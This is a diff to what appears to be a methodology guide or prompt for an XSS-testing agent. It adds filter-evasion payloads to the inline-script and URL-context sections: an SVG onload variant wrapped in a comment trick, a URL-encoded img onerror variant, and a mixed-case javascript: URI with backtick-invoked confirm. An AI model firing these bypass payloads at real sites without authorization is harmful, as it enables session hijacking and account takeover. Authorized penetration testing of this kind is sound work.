@@ -18,6 +18,8 @@ Your payload must appear in the response body with angle brackets UNESCAPED. `<s
 1. **Inline script injection** (works when HTML context allows new tags):
    ```
    <script>alert(CANARY)</script>
+   1<!--><Svg/OnLoad=(confirm)(CANARY)-->
+   1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(CANARY)%3E
    ```
    Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.
 
@@ -31,6 +33,7 @@ Your payload must appear in the response body with angle brackets UNESCAPED. `<s
 3. **URL/href context:**
    ```
    javascript:alert(CANARY)
+   JavaScript:confirm`(CANARY)`
    ```
 
 **Distinguishing success from failure:**
